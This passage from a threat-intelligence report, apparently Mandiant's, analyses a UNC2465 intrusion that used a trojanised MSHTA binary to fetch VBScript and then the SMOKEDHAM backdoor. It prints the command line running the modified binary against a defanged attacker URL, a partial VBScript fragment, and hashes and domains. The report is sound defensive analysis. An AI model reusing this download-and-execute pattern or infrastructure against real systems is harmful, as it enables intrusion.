@@ -1,0 +1,15 @@
+
+This functionality matched the behavior of the legitimate MSHTA.exe despite the hash discrepancy.
+Further analysis showed that the malware was based on a 2018 version of the binary (original hash: 5ced5d5b469724d9992f5e8117ecefb5) with only six bytes of data appended, as shown in Figure 4.
+Figure 4: CyberChef diff between MSHTA.exe and smartpss.exe Phase 3: Downloaded VBScript and PowerShell Upon execution, the modified Mshta file was executed with the URL, hxxp://sdoc[.]xyz/ID-508260156241, and passed as an argument on the command line.
+Domain sdoc[.]xyz was first associated with UNC2465 by RiskIQ in a May 20, 2021, blog post researching the infrastructure that Mandiant previously reported.
+According to RiskIQ, sdoc[.]xyz shares a registrant with koliz[.]xyz, which was also observed by Mandiant in past UNC2465 intrusions.
+C:\\PROGRAMDATA\\SMARTPSS-Win32_ChnEng_IS\\smartpss.exe hxxp://sdoc[.]xyz/ID-508260156241 The execution of the modified Mshta file resulted in the creation of a HTM file called loubSi78Vgb9[1].htm that was written to a temporary INetCache directory.
+Mandiant was not able to acquire this file at the time of writing; however, Mandiant was able to recover partial contents of the file.
+<html><head>..
+<script language='VBScript'>..
+On Error Resume
+Next At the time of writing, sdoc[.]xyz appeared to be active, but not returning the VBScript code.
+It is not clear if sdoc[.]xyz was selecting victims based on IP or other properties or was simply dormant.
+A PCAP from a sandbox execution on VirusTotal from May 26, 2021, also showed benign content being served.
+Figure 5: PCAP from e9ed774517e129a170cdb856bd13e7e8 VirusTotal results not returning malicious content Shortly after the download, a PowerShell script block was executed to download SMOKEDHAM, as shown in Figure 6.
